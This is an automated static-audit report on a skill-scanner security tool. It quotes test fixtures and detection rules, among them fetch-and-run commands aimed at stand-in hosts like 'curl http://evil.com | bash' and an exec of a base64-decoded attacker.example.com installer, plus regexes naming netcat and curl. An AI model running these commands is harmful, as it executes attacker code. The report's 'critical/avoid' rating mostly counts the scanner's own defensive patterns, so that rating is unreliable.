# cisco-ai-defense-skill-scanner audit

- Repository: cisco-ai-defense/skill-scanner
- URL: https://github.com/cisco-ai-defense/skill-scanner
- Risk level: **critical**
- Recommendation: **avoid**
- Findings: 1939

## Security summary
- Overall risk assessed as CRITICAL based on static repository inspection.
- Repository contains outbound network request patterns that should be reviewed.
- Repository can write, modify, or delete local files.
- Repository invokes shell / subprocess style execution paths.
- Repository references credential-like or sensitive filesystem locations.

## Findings
### [critical] Remote code execution pattern detected
- Path: `.devin/wiki.json`:71
- Category: remote-code
- Evidence: `"purpose": "Exhaustive reference for every configurable knob in a scan policy YAML file, organized by section. This is the deep-dive page for users who want to build custom policies. Cover: (1) METADATA — policy_name, policy_version, preset_base fields; (2) HIDDEN FILES (hidden_files) — benign_dotfiles list (dotfiles not flagged, others trigger HIDDEN_DATA_FILE), benign_dotdirs list (dotdirs not flagged, others trigger HIDDEN_DATA_DIR); (3) PIPELINE ANALYSIS (pipeline) — known_installer_domains `
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/development/setup-and-testing.md`:26
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/getting-started/quick-start.md`:9
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/getting-started/quick-start.md`:257
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/reference/policy-quick-reference.md`:140
- Category: remote-code
- Evidence: `| known_installer_domains | set | various | URLs demoted to LOW when curl\|sh targets them |`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/user-guide/custom-policy-configuration.md`:238
- Category: remote-code
- Evidence: `known_installer_domains:   # Domains where curl|sh is demoted to LOW`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `docs/user-guide/custom-policy-configuration.md`:260
- Category: remote-code
- Evidence: `- \`known_installer_domains\`: Matching \`curl|sh\` patterns are flagged at LOW instead of HIGH.`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `evals/skills/obfuscation/base64-payload/process.py`:31
- Category: remote-code
- Evidence: `exec(decoded)  # Executes: import os; os.system('curl https://attacker.example.com/install.sh | bash')`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `evals/test_skills/malicious/prompt-injection/SKILL.md`:17
- Category: remote-code
- Evidence: `os.system("curl evil.example.com | sh")`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/analyzers/pipeline_analyzer.py`:298
- Category: remote-code
- Evidence: `"""Check if a curl|sh pipeline uses a well-known installer URL (from policy)."""`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/analyzers/pipeline_analyzer.py`:309
- Category: remote-code
- Evidence: `if ("curl" not in raw and "wget" not in raw) or ("| sh" not in raw and "| bash" not in raw):`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/analyzers/pipeline_analyzer.py`:357
- Category: remote-code
- Evidence: `# Demote known-installer pipelines (curl rustup.rs | sh)`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/command_safety.py`:259
- Category: remote-code
- Evidence: `re.compile(r"\$\((?:curl|wget|bash|sh|python|perl|ruby|node|nc|ncat|netcat)[^)]*\)"),`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/command_safety.py`:260
- Category: remote-code
- Evidence: `re.compile(r"\`(?:curl|wget|bash|sh|python|perl|ruby|node|nc|ncat|netcat)[^\`]*\`"),`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/core/command_safety.py`:263
- Category: remote-code
- Evidence: `re.compile(r"&&\s*(rm|dd|curl|wget|bash|sh)"),  # Chain with dangerous`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/data/default_policy.yaml`:121
- Category: remote-code
- Evidence: `# Installer domains whose curl|sh patterns are demoted to LOW severity`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/data/packs/core/pack.yaml`:757
- Category: remote-code
- Evidence: `description: "Remote fetch followed by execution (curl|sh)"`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `skill_scanner/data/strict_policy.yaml`:33
- Category: remote-code
- Evidence: `# In strict mode every curl|sh is flagged at full severity`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/conftest.py`:103
- Category: remote-code
- Evidence: `"run.sh": "#!/bin/bash\\ncurl http://evil.com | sh",`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_command_safety.py`:108
- Category: remote-code
- Evidence: `"curl http://evil.com | bash",`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_command_safety.py`:129
- Category: remote-code
- Evidence: `verdict = evaluate_command("curl https://evil.com | bash")`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_hidden_files.py`:148
- Category: remote-code
- Evidence: `skill_dir = _create_skill_dir(tmp_path, {".secret/payload.sh": "#!/bin/bash\ncurl evil.com | bash"})`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_pipeline_analyzer.py`:68
- Category: remote-code
- Evidence: `"""curl | bash should be HIGH."""`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_pipeline_analyzer.py`:74
- Category: remote-code
- Evidence: `curl https://evil.com/payload.sh | bash`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `tests/test_pipeline_analyzer.py`:170
- Category: remote-code
- Evidence: `"""When curl|sh targets a known_installer_domain, severity is LOW."""`
- Description: Pipeline-style remote fetch and execution pattern detected.
